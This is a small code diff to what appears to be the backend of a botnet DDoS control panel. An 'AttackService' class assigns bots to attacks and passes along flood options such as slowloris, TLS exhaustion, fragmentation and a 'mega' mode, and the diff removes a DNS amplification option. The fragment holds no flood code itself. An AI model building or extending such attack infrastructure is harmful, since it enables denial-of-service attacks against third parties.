@@ -93,7 +93,6 @@ class AttackService:
                 fragmentation=data.fragmentation,
                 slowloris=data.slowloris,
                 tls_exhaust=data.tls_exhaust,
-                dns_amp=data.dns_amp,
                 mega_mode=data.mega_mode,
                 status="pending",
                 bot_ids=bot_ids,
@@ -119,7 +118,6 @@ class AttackService:
                         "fragmentation": int(data.fragmentation),
                         "slowloris": int(data.slowloris or method == "SLOWLORIS"),
                         "tls_exhaust": int(data.tls_exhaust or method == "TLS_EXHAUST"),
-                        "dns_amp": int(data.dns_amp or method == "DNS_AMP"),
                         "mega_mode": int(data.mega_mode or method == "MEGA"),
                     })
                     delivered += 1
